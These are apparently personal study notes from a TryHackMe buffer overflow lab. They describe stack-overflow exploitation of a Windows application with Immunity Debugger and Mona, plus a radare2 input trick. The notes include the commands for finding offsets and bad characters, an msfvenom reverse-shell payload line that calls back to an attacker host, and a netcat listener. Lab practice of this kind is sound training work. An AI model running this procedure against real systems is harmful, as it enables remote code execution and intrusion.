# Buffer Overflow

## Using a File As Input In Radare 2
```bash
echo -e "12345678901234\x67\x05\x40" > over.txt
r2 -A -d ./executable
dor stdin=over.txt
doo
```

## Windows Application

Those are my notes taken after doing the [Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep) room on TryHackMe.

There is also a [post explaining the same thing](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst).

### Install Needed Tools
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Mona Plugin](https://github.com/corelan/mona)

### Exploit
* Run the application in Immunity
    * Between each tests, you will need to 
        * Restart the session (Ctrl-F2)
        * Lauch the application (F9)
* Configure Mona
    * `!mona config -set workingfolder c:\mona\%p`
* Try fuzzing the application with the [fuzzing.py](BufferOverflow/Windows/fuzzing.py) script
    * Note how many bytes crashes the application
* Find EIP offset with the [exploit.py](BufferOverflow/Windows/exploit.py) script
    * Use metasploit to generate a pattern 400 bytes longer than the strings that crashed the application
        * `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <BytesToCrashPlus400>`
    * Copy the pattern and use it as payload in the exploit script
    * Run the script
    * Find the offset in Immunity 
        * `!mona findmsp -distance <BytesToCrashPlus400>`
        * This will print a few lines, look for : `EIP contains normal pattern : ... (offset XXXX)`
        * Note the offset
    * Modify the exploit script
        * Set the offset to the one we found
        * Set the return address to BBBB
* Find Bad Charaters
    * Generate a list of possible bad characters with the [generate.py](BufferOverflow/Windows/generate.py) script
        * Copy the generated string and use it as the payload in exploy.py
    * In Immunity generate a byte array with possible characters
        * `!mona bytearray -b "\x00"`
    * Run exploit.py
    * Find bad character in Immunity
        * Copy the ESP address
        * `!mona compare -f C:\mona\oscp\bytearray.bin -a <address>`
        * Note the first bad character found not in your list
    * Regenate the Mona bytes array without the found character
        * `!mona bytearray -b "\x00\xXX"`
    * Remove the found character from the payload
    * Repeat until Mona compare returns 'Unmodified'
* Find a Jump Point
    * In Immunity run 
        * `!mona jmp -r esp -cpb "<List of bad characters>"`
    * Open the 'Log data' window and pick an address to jump to from the list
    * Convert the address to little endian
    * Modify the return address in exploit.py to the address you found
* Generate the payload
    * `msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<List of bad characters>" -f py`
    * Use the generated code for the payload in exploit.py
* Prepend NOPs
    * Add some NOPs in exploit.py
        * `padding = "\x90" * 16`
* Start your netcat listener
    `nc -klvnp 4444`
* Run the exploit script
